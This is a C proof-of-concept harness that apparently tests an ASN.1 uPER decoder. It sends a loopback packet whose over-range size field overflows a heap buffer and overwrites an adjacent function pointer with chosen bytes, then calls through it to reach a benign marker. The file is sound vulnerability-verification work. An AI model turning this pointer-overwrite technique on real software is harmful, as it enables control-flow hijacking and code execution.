/* Pointer-target consumer probe for the pinned over-range uPER size-field
 * write.  A lab-constructed ASN.1 consumer embeds the generated SIZE(0..17)
 * Payload as the first member of a heap Session, with a callback function
 * pointer immediately after it.  The hostile packet's decoded byte 20..27
 * overwrites that pointer through the real pinned runtime's per-byte store.
 * Calling through the pointer reaches a benign marker chosen by the wire.
 *
 * This is NOT a real ASN.1 application: the Session layout and the marker
 * address are lab conditions, stated openly.  Loopback only (127.0.0.1).
 *
 * Usage: pointer-target <client|server> <port> <count> <hex-chosen-bytes>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "asn1crt_encoding.h"
#include "schema.h"

typedef struct {
    Payload payload;                   /* generated type, sizeof 24 */
    void (* volatile handler)(void);   /* x86-64 offset 24 */
    unsigned char canary[8];           /* offset 32 */
} Session;

static void safe_handler(void) { puts("SAFE: original handler intact"); }
static void marker(void) { puts("MARKER: control-flow diverted to chosen address"); }

/* Empty hook placed immediately after allocation so a gdb script can set a
 * hardware watchpoint on a live s->handler before the decoder runs. */
static void instrument(Session *s, const unsigned char *chosen)
{
    (void)s; (void)chosen;
}

static void put_bits(unsigned char *buf, int *bitpos, unsigned value, int nbits)
{
    int i;
    for (i = nbits - 1; i >= 0; i--) {
        if ((value >> i) & 1)
            buf[*bitpos / 8] |= (unsigned char)(0x80 >> (*bitpos % 8));
        (*bitpos)++;
    }
}

static int read_full(int fd, unsigned char *buf, int n)
{
    int got = 0;
    while (got < n) {
        ssize_t r = read(fd, buf + got, (size_t)(n - got));
        if (r <= 0) return -1;
        got += (int)r;
    }
    return 0;
}

static int hexval(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static int parse_hex(const char *s, unsigned char *out, int n)
{
    int i;
    if (strlen(s) != (size_t)(2 * n)) return -1;
    for (i = 0; i < n; i++) {
        int hi = hexval(s[2 * i]), lo = hexval(s[2 * i + 1]);
        if (hi < 0 || lo < 0) return -1;
        out[i] = (unsigned char)((hi << 4) | lo);
    }
    return 0;
}

int main(int argc, char **argv)
{
    const char *role = argc > 1 ? argv[1] : "server";
    int port = argc > 2 ? atoi(argv[2]) : 39281;
    int count = argc > 3 ? atoi(argv[3]) : 31;
    unsigned char chosen[64], wire[128];
    int bitpos = 0, wlen, i;
    setvbuf(stdout, NULL, _IONBF, 0);

    if (count > 64 || argc < 5 || parse_hex(argv[4], chosen, count) != 0)
        return 2;

    memset(wire, 0, sizeof(wire));
    put_bits(wire, &bitpos, (unsigned)count, 5);
    for (i = 0; i < count; i++)
        put_bits(wire, &bitpos, chosen[i], 8);
    wlen = (bitpos + 7) / 8;

    if (!strcmp(role, "client")) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa;
        if (fd < 0) return 2;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons((uint16_t)port);
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) return 2;
        if (write(fd, wire, (size_t)wlen) != wlen) { close(fd); return 2; }
        printf("client sent %d bytes count=%d\n", wlen, count);
        close(fd);
        return 0;
    }

    {
        int lfd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa;
        socklen_t sl = sizeof(sa);
        int fd, yes = 1;
        if (lfd < 0) return 2;
        setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons((uint16_t)port);
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) != 0) return 2;
        if (listen(lfd, 1) != 0) return 2;
        fd = accept(lfd, (struct sockaddr *)&sa, &sl);
        if (fd < 0) return 2;
        close(lfd);
        if (read_full(fd, wire, wlen) != 0) { close(fd); return 2; }
        close(fd);
    }

    {
        Session *s = (Session *)calloc(1, sizeof(Session));
        BitStream bs;
        int err = -1, j;
        flag ok;
        size_t hoff = offsetof(Session, handler) - offsetof(Session, payload);
        if (!s) return 2;
        s->handler = safe_handler;
        memset(s->canary, 0xC0, sizeof(s->canary));
        printf("sizeof(Session)=%zu handler at Payload offset %zu..%zu"
               " (chosen bytes %zu..%zu)\n",
               sizeof(Session), hoff, hoff + sizeof(void *) - 1,
               hoff - offsetof(Payload, arr),
               hoff - offsetof(Payload, arr) + sizeof(void *) - 1);
        instrument(s, chosen);
        BitStream_AttachBuffer(&bs, wire, (long)wlen);
        ok = Payload_Decode(&s->payload, &bs, &err);
        printf("svc ok=%d err=%d decoded=%d handler=%p safe=%p marker=%p\n",
               ok, err, s->payload.nCount, (void *)s->handler,
               (void *)safe_handler, (void *)marker);
        printf("handler bytes:");
        for (j = 0; j < (int)sizeof(void *); j++)
            printf(" %02x", ((unsigned char *)&s->handler)[j]);
        printf("\ncanary:");
        for (j = 0; j < (int)sizeof(s->canary); j++) printf(" %02x", s->canary[j]);
        printf("\n");
        /* The call is the observation: vulnerable = marker, fixed = safe. */
        s->handler();
        return 0;
    }
}
